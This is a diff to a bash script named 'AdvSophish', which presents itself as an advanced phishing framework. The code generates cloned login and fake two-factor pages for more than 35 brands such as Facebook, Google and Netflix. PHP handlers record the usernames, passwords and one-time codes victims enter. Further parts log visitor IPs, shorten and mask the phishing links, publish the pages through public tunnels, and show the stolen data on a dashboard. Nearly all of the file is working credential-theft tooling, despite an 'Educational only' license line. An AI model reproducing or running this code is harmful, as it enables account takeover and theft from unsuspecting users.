@@ -1,33 +1,44 @@
 #!/bin/bash
 
-##   AdvSophish - Advanced Phishing Framework
+##   AdvSophish - Advanced Phishing Framework (Portable)
 ##   Author: mahi-cyberaware
-##   Version: 3.2.0
+##   Version: 3.2.1
 ##   GitHub: https://github.com/mahi-cyberaware/AdvSophish
 
 set -euo pipefail
 trap 'kill_pid; reset_color' INT TERM EXIT
 
-# ------------------------------- Config ----------------------------------
+# ------------------------------- Portable Base Dir -------------------------
+if command -v realpath &>/dev/null; then
+    BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
+else
+    BASE_DIR=$(cd "$(dirname "$BASH_SOURCE")" && pwd)
+fi
+
 HOST='127.0.0.1'
 PORT='8080'
 DASHBOARD_PORT='8081'
-MASK_URL=""   # Optional: set to "https://your-mask.com" to enable masking
+MASK_URL=""
 
-# Colors
-RED="$(printf '\033[31m')"
-GREEN="$(printf '\033[32m')"
-ORANGE="$(printf '\033[33m')"
-BLUE="$(printf '\033[34m')"
-CYAN="$(printf '\033[36m')"
-WHITE="$(printf '\033[37m')"
-RESET="$(printf '\e[0m\n')"
+# ------------------------------- Safe Colors -------------------------------
+RED='\033[31m'
+GREEN='\033[32m'
+ORANGE='\033[33m'
+BLUE='\033[34m'
+CYAN='\033[36m'
+WHITE='\033[37m'
+RESET='\033[0m'
 
-BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
+if ! command -v tput &>/dev/null; then
+    reset_color() { printf "%b" "$RESET"; }
+else
+    reset_color() { tput sgr0; tput op 2>/dev/null || true; }
+fi
+
+# ------------------------------- Create directories -------------------------
 mkdir -p "$BASE_DIR/.server/www" "$BASE_DIR/auth" "$BASE_DIR/dashboard/assets"
 
-# ------------------------------- Helper Functions -------------------------
-reset_color() { tput sgr0; tput op 2>/dev/null || true; }
+# ------------------------------- Helper Functions --------------------------
 kill_pid() { for proc in php cloudflared loclx; do pkill -f "$proc" 2>/dev/null; done; }
 
 banner() {
@@ -38,29 +49,33 @@ banner() {
 		${ORANGE}  / _ \ | |   | |       | | | '_ \| / __| '_ \ 
 		${ORANGE} / ___ \| |___| |___    | | | | | | \__ \ | | |
 		${ORANGE}/_/   \_\_____|_____|   |_| |_| |_|_|___/_| |_|
-		${ORANGE}                                              
-		${ORANGE}                AdvSophish ${RED}Version : 3.2.0
+		${ORANGE}                AdvSophish ${RED}Version : 3.2.1
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Advanced Phishing Framework - mahi-cyberaware${RESET}
 	EOF
 }
 
-# ------------------------------- Dependency Management --------------------
 dependencies() {
     echo -e "\n${GREEN}[+]${CYAN} Checking dependencies..."
-    local pkgs=(php curl unzip)
-    for pkg in "${pkgs[@]}"; do
-        if ! command -v "$pkg" &>/dev/null; then
-            echo -e "${GREEN}[+]${ORANGE} Installing $pkg..."
-            if command -v pkg &>/dev/null; then pkg install "$pkg" -y
-            elif command -v apt &>/dev/null; then sudo apt install "$pkg" -y
-            elif command -v pacman &>/dev/null; then sudo pacman -S "$pkg" --noconfirm
-            elif command -v dnf &>/dev/null; then sudo dnf install "$pkg" -y
-            else echo -e "${RED}[-] No package manager. Install $pkg manually.${RESET}"; exit 1
-            fi
-        fi
-    done
-    echo -e "${GREEN}[+] All dependencies OK.${RESET}"
+    local missing=()
+    command -v php &>/dev/null || missing+=("php")
+    command -v curl &>/dev/null || missing+=("curl")
+    command -v unzip &>/dev/null || missing+=("unzip")
+    if [[ ${#missing[@]} -eq 0 ]]; then
+        echo -e "${GREEN}[+] All dependencies OK.${RESET}"
+        return
+    fi
+    echo -e "${ORANGE}[!] Missing: ${missing[*]}${RESET}"
+    if command -v apt &>/dev/null; then
+        apt update && apt install -y "${missing[@]}"
+    elif command -v pkg &>/dev/null; then
+        pkg install -y "${missing[@]}"
+    elif command -v pacman &>/dev/null; then
+        pacman -S --noconfirm "${missing[@]}"
+    else
+        echo -e "${RED}[-] No supported package manager. Install ${missing[*]} manually.${RESET}"
+        exit 1
+    fi
 }
 
 install_cloudflared() {
@@ -98,7 +113,6 @@ install_localxpose() {
 generate_all_sites() {
     echo -e "${GREEN}[+] Generating all 35+ phishing templates with original logos...${RESET}"
     
-    # Site definitions: (folder, display name, brand color, logo fontawesome, bg style)
     declare -A SITE_STYLES
     SITE_STYLES["tiktok"]="TikTok|#010101|fab fa-tiktok"
     SITE_STYLES["facebook_tfo"]="Facebook|#1877f2|fab fa-facebook"
@@ -136,91 +150,58 @@ generate_all_sites() {
         [[ -d "$site_dir" ]] && continue
         mkdir -p "$site_dir"
         
-        # Create a unified style.css with Font Awesome + site branding
         cat > "$site_dir/style.css" <<-CSS
-		* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
-		body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-		.card { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 100%; max-width: 400px; padding: 20px; text-align: center; }
-		.logo { font-size: 48px; color: $color; margin-bottom: 20px; }
-		h2 { color: $color; margin-bottom: 20px; }
-		input { width: 100%; padding: 14px 16px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
-		button { background: $color; border: none; color: white; font-size: 20px; font-weight: bold; padding: 12px; border-radius: 6px; width: 100%; cursor: pointer; margin-top: 10px; }
-		button:hover { opacity: 0.9; }
-		.footer { margin-top: 20px; color: #777; font-size: 14px; }
-		CSS
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, sans-serif; }
+body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+.card { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; padding: 20px; text-align: center; }
+.logo { font-size: 48px; color: $color; margin-bottom: 20px; }
+h2 { color: $color; margin-bottom: 20px; }
+input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; }
+button { background: $color; border: none; color: white; font-size: 20px; font-weight: bold; padding: 12px; border-radius: 6px; width: 100%; cursor: pointer; }
+.footer { margin-top: 20px; color: #777; font-size: 14px; }
+CSS
 
-        # Login page (index.html)
         cat > "$site_dir/index.html" <<-HTML
-		<!DOCTYPE html>
-		<html>
-		<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>$name - Sign In</title>
-		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-		<link rel="stylesheet" href="style.css">
-		</head>
-		<body>
-		<div class="card">
-		    <div class="logo"><i class="$icon"></i></div>
-		    <h2>Sign in to $name</h2>
-		    <form method="POST" action="login.php">
-		        <input type="text" name="username" placeholder="Email or Phone" required autofocus>
-		        <input type="password" name="password" placeholder="Password" required>
-		        <button type="submit">Log In</button>
-		    </form>
-		    <div class="footer">Forgot password? · Create account</div>
-		</div>
-		</body>
-		</html>
-		HTML
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>$name - Sign In</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="card"><div class="logo"><i class="$icon"></i></div><h2>Sign in to $name</h2>
+<form method="POST" action="login.php"><input type="text" name="username" placeholder="Email or Phone" required autofocus>
+<input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form>
+<div class="footer">Forgot password? · Create account</div></div>
+</body></html>
+HTML
 
-        # login.php
         cat > "$site_dir/login.php" <<-PHP
-		<?php
-		\$data = "$site_id|" . \$_POST['username'] . "|" . \$_POST['password'] . "|" . date('Y-m-d H:i:s');
-		file_put_contents('../../auth/usernames.dat', \$data . PHP_EOL, FILE_APPEND);
-		header('Location: otp.html');
-		exit;
-		PHP
+<?php
+\$data = "$site_id|" . \$_POST['username'] . "|" . \$_POST['password'] . "|" . date('Y-m-d H:i:s');
+file_put_contents('../../auth/usernames.dat', \$data . PHP_EOL, FILE_APPEND);
+header('Location: otp.html');
+exit;
+PHP
 
-        # OTP page (looks like 2FA step)
         cat > "$site_dir/otp.html" <<-HTML
-		<!DOCTYPE html>
-		<html>
-		<head><meta charset="UTF-8"><title>Two‑Factor Authentication</title>
-		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-		<link rel="stylesheet" href="style.css">
-		</head>
-		<body>
-		<div class="card">
-		    <div class="logo"><i class="fas fa-shield-alt"></i></div>
-		    <h2>Two‑Factor Authentication</h2>
-		    <p style="margin-bottom: 15px;">Enter the 6-digit code from your authenticator app.</p>
-		    <form method="POST" action="otp.php">
-		        <input type="text" name="otp" placeholder="000000" required maxlength="6">
-		        <button type="submit">Verify</button>
-		    </form>
-		</div>
-		</body>
-		</html>
-		HTML
+<!DOCTYPE html>
+<html><head><title>2FA Verification</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"><link rel="stylesheet" href="style.css"></head>
+<body><div class="card"><div class="logo"><i class="fas fa-shield-alt"></i></div><h2>Two‑Factor Authentication</h2><p>Enter the 6-digit code from your authenticator app.</p>
+<form method="POST" action="otp.php"><input type="text" name="otp" placeholder="000000" required maxlength="6"><button type="submit">Verify</button></form></div></body></html>
+HTML
 
-        # otp.php
         cat > "$site_dir/otp.php" <<-PHP
-		<?php
-		\$data = "$site_id|" . \$_POST['otp'] . "|" . date('Y-m-d H:i:s');
-		file_put_contents('../../auth/otp.dat', \$data . PHP_EOL, FILE_APPEND);
-		// Redirect to real website
-		\$redirect = "https://www.google.com";
-		header("Location: \$redirect");
-		exit;
-		PHP
+<?php
+\$data = "$site_id|" . \$_POST['otp'] . "|" . date('Y-m-d H:i:s');
+file_put_contents('../../auth/otp.dat', \$data . PHP_EOL, FILE_APPEND);
+header('Location: https://www.google.com');
+exit;
+PHP
 
-        # IP logger (ip.php)
         cat > "$site_dir/ip.php" <<-'PHP'
-		<?php
-		$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
-		file_put_contents('ip.txt', "IP: $ip - " . date('Y-m-d H:i:s') . PHP_EOL, FILE_APPEND);
-		?>
-		PHP
+<?php $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown'; file_put_contents('ip.txt', "IP: $ip - " . date('Y-m-d H:i:s') . PHP_EOL, FILE_APPEND); ?>
+PHP
 
         echo -e "${GREEN}[✓] Generated $site_id ($name)${RESET}"
     done
@@ -229,7 +210,7 @@ generate_all_sites() {
 # ------------------------------- Phishing Engine --------------------------
 setup_site() {
     local site_id="$1"
-    generate_all_sites   # ensures all exist
+    generate_all_sites
     rm -rf ".server/www"/*
     cp -rf ".sites/$site_id"/* ".server/www/"
     cd ".server/www"
@@ -239,29 +220,19 @@ setup_site() {
 }
 
 capture_data() {
-    local creds_file="$BASE_DIR/auth/usernames.dat"
-    local otp_file="$BASE_DIR/auth/otp.dat"
     echo -e "\n${GREEN}[+]${CYAN} Waiting for victim... (Ctrl+C to stop)${RESET}"
-    tail -f "$creds_file" "$otp_file" 2>/dev/null | while read line; do
-        if [[ "$line" =~ ^[a-z_]+| ]]; then
-            echo -e "${RED}[!]${GREEN} Capture: ${BLUE}$line${RESET}"
-        fi
+    tail -n0 -f "$BASE_DIR/auth/usernames.dat" "$BASE_DIR/auth/otp.dat" 2>/dev/null | while read line; do
+        echo -e "${RED}[!]${GREEN} Capture: ${BLUE}$line${RESET}"
     done
 }
 
-# ------------------------------- Obfuscation -------------------------------
 obfuscate_url() {
     local long_url="$1"
     local short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$long_url" 2>/dev/null)
     [[ -z "$short_url" || "$short_url" == *"Error"* ]] && short_url=$(curl -s "https://tinyurl.com/api-create.php?url=$long_url" 2>/dev/null)
     [[ -z "$short_url" ]] && short_url="$long_url"
-    
-    echo -e "${GREEN}Original: ${CYAN}$long_url${RESET}"
     echo -e "${GREEN}Shortened: ${CYAN}$short_url${RESET}"
-    if [[ -n "$MASK_URL" ]]; then
-        local masked="${MASK_URL}@${short_url#https://}"
-        echo -e "${GREEN}Masked: ${CYAN}$masked${RESET}"
-    fi
+    [[ -n "$MASK_URL" ]] && echo -e "${GREEN}Masked: ${CYAN}${MASK_URL}@${short_url#https://}${RESET}"
 }
 
 # ------------------------------- Tunnels -----------------------------------
@@ -298,52 +269,17 @@ start_localhost() {
 
 # ------------------------------- Dashboard ----------------------------------
 start_dashboard() {
-    # Create dashboard files if missing
     if [[ ! -f "dashboard/index.php" ]]; then
         mkdir -p dashboard
         cat > "dashboard/index.php" <<-'DASH'
 <?php
 $creds_file = '../auth/usernames.dat';
 $otp_file = '../auth/otp.dat';
-$creds = [];
-$otps = [];
-if (file_exists($creds_file)) {
-    $lines = file($creds_file, FILE_IGNORE_NEW_LINES);
-    foreach ($lines as $line) {
-        $d = explode('|', $line);
-        if (count($d)>=4) $creds[] = ['site'=>$d[0],'user'=>$d[1],'pass'=>$d[2],'time'=>$d[3]];
-    }
-}
-if (file_exists($otp_file)) {
-    $lines = file($otp_file, FILE_IGNORE_NEW_LINES);
-    foreach ($lines as $line) {
-        $d = explode('|', $line);
-        if (count($d)>=3) $otps[] = ['site'=>$d[0],'otp'=>$d[1],'time'=>$d[2]];
-    }
-}
-if (isset($_GET['del'])) {
-    if ($_GET['del']=='creds') file_put_contents($creds_file,'');
-    if ($_GET['del']=='otp') file_put_contents($otp_file,'');
-    header('Location: index.php'); exit;
-}
-?><!DOCTYPE html>
-<html><head><title>AdvSophish Dashboard</title><style>
-body{background:#0a0e1a;color:#eee;font-family:monospace;padding:20px;}
-.container{max-width:1400px;margin:auto;background:#161c2c;border-radius:12px;padding:20px;}
-h1{color:#ff9800;}
-table{width:100%;border-collapse:collapse;margin-top:20px;}
-th,td{padding:10px;text-align:left;border-bottom:1px solid #2a3246;}
-th{background:#0f1422;}
-.btn{background:#2a3a5a;color:white;padding:8px 16px;text-decoration:none;border-radius:6px;margin-right:10px;}
-.btn-danger{background:#a12a2a;}
-</style></head>
-<body><div class=container><h1>AdvSophish Dashboard</h1>
-<div><a class=btn href="?del=creds">Clear Credentials</a><a class=btn href="?del=otp">Clear OTPs</a></div>
-<h2>Credentials (<?=count($creds)?>)</h2><tr><tr><th>Site</th><th>Username</th><th>Password</th><th>Time</th></tr>
-<?php foreach($creds as $c) echo "<tr><td>{$c['site']}</td><td>{$c['user']}</td><td>{$c['pass']}</td><td>{$c['time']}</td></tr>"; ?>
-</table><h2>OTPs (<?=count($otps)?>)</h2><table><tr><th>Site</th><th>OTP</th><th>Time</th></tr>
-<?php foreach($otps as $o) echo "<tr><td>{$o['site']}</td><td>{$o['otp']}</td><td>{$o['time']}</td></tr>"; ?>
-</table></div></body></html>
+$creds = []; $otps = [];
+if (file_exists($creds_file)) { $lines = file($creds_file, FILE_IGNORE_NEW_LINES); foreach ($lines as $line) { $d = explode('|', $line); if (count($d)>=4) $creds[] = ['site'=>$d[0],'user'=>$d[1],'pass'=>$d[2],'time'=>$d[3]]; } }
+if (file_exists($otp_file)) { $lines = file($otp_file, FILE_IGNORE_NEW_LINES); foreach ($lines as $line) { $d = explode('|', $line); if (count($d)>=3) $otps[] = ['site'=>$d[0],'otp'=>$d[1],'time'=>$d[2]]; } }
+if (isset($_GET['del'])) { if ($_GET['del']=='creds') file_put_contents($creds_file,''); if ($_GET['del']=='otp') file_put_contents($otp_file,''); header('Location: index.php'); exit; }
+?><!DOCTYPE html><html><head><title>AdvSophish Dashboard</title><style>body{background:#0a0e1a;color:#eee;font-family:monospace;padding:20px;}.container{max-width:1400px;margin:auto;background:#161c2c;border-radius:12px;padding:20px;}h1{color:#ff9800;}table{width:100%;border-collapse:collapse;margin-top:20px;}th,td{padding:10px;text-align:left;border-bottom:1px solid #2a3246;}th{background:#0f1422;}.btn{background:#2a3a5a;color:white;padding:8px 16px;text-decoration:none;border-radius:6px;margin-right:10px;}.btn-danger{background:#a12a2a;}</style></head><body><div class=container><h1>AdvSophish Dashboard</h1><div><a class=btn href="?del=creds">Clear Credentials</a><a class=btn href="?del=otp">Clear OTPs</a></div><h2>Credentials (<?=count($creds)?>)</h2><table><tr><th>Site</th><th>Username</th><th>Password</th><th>Time</th></tr><?php foreach($creds as $c) echo "<tr><td>{$c['site']}</td><td>{$c['user']}</td><td>{$c['pass']}</td><td>{$c['time']}</td></tr>"; ?></table><h2>OTPs (<?=count($otps)?>)</h2><table><tr><th>Site</th><th>OTP</th><th>Time</th></tr><?php foreach($otps as $o) echo "<tr><td>{$o['site']}</td><td>{$o['otp']}</td><td>{$o['time']}</td></tr>"; ?></table></div></body></html>
 DASH
     fi
     echo -e "\n${GREEN}[+] Starting dashboard on port $DASHBOARD_PORT ...${RESET}"
@@ -356,7 +292,6 @@ DASH
 }
 
 # ------------------------------- Main Menu ----------------------------------
-# List of all 35 sites (order from your image)
 SITE_IDS=(
     tiktok facebook_tfo instagram_tfo ubereats_tfo aijo_tfo google_tfo
     twitch_tfo netflix_tfo instagram_followers amazon_tfo whatsapp_tfo
@@ -370,8 +305,9 @@ show_menu() {
     echo -e "\n${ORANGE}Available Phishing Targets:${RESET}"
     local i=1
     for id in "${SITE_IDS[@]}"; do
-        printf "${RED}[${WHITE}%02d${RED}]${ORANGE} %-18s" "$i" "$(echo $id | tr '_' ' ' | sed 's/tfo//g' | sed 's/_/ /g' | awk '{for(j=1;j<=NF;j++) $j=toupper(substr($j,1,1)) tolower(substr($j,2))}1')"
-        if (( i % 3 == 0 )); then echo; fi
+        name=$(echo $id | tr '_' ' ' | sed 's/tfo//g' | sed 's/_/ /g' | awk '{for(j=1;j<=NF;j++) $j=toupper(substr($j,1,1)) tolower(substr($j,2))}1')
+        printf "${RED}[${WHITE}%02d${RED}]${ORANGE} %-18s" $i "$name"
+        (( i % 3 == 0 )) && echo
         ((i++))
     done
     echo -e "\n${RED}[${WHITE}88${RED}]${ORANGE} Dashboard"
@@ -383,18 +319,19 @@ main_menu() {
     banner
     show_menu
     read -p "${GREEN}[+] Choose option: ${BLUE}" choice
-    if [[ "$choice" == "00" ]]; then
-        echo -e "\n${GREEN}Exiting...${RESET}"; kill_pid; exit 0
-    elif [[ "$choice" == "88" ]]; then
-        start_dashboard; main_menu; return
-    elif [[ "$choice" == "99" ]]; then
-        banner; echo -e "${CYAN}Author: mahi-cyberaware\nGitHub: https://github.com/mahi-cyberaware/AdvSophish\nVersion: 3.2.0\nLicense: Educational only${RESET}"; read -n1; main_menu; return
-    elif [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#SITE_IDS[@]} )); then
-        SELECTED_SITE="${SITE_IDS[$((choice-1))]}"
-        tunnel_menu
-    else
-        echo -e "${RED}Invalid option${RESET}"; sleep 1; main_menu
-    fi
+    case $choice in
+        00) echo -e "\n${GREEN}Exiting...${RESET}"; kill_pid; exit 0 ;;
+        88) start_dashboard; main_menu; return ;;
+        99) banner; echo -e "${CYAN}Author: mahi-cyberaware\nGitHub: https://github.com/mahi-cyberaware/AdvSophish\nVersion: 3.2.1\nLicense: Educational only${RESET}"; read -n1; main_menu; return ;;
+        *)
+            if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#SITE_IDS[@]} )); then
+                SELECTED_SITE="${SITE_IDS[$((choice-1))]}"
+                tunnel_menu
+            else
+                echo -e "${RED}Invalid option${RESET}"; sleep 1; main_menu
+            fi
+            ;;
+    esac
 }
 
 tunnel_menu() {
@@ -419,5 +356,5 @@ tunnel_menu() {
 # ------------------------------- Start -------------------------------------
 kill_pid
 dependencies
-generate_all_sites   # creates all templates on first run (no changes needed)
+generate_all_sites
 main_menu
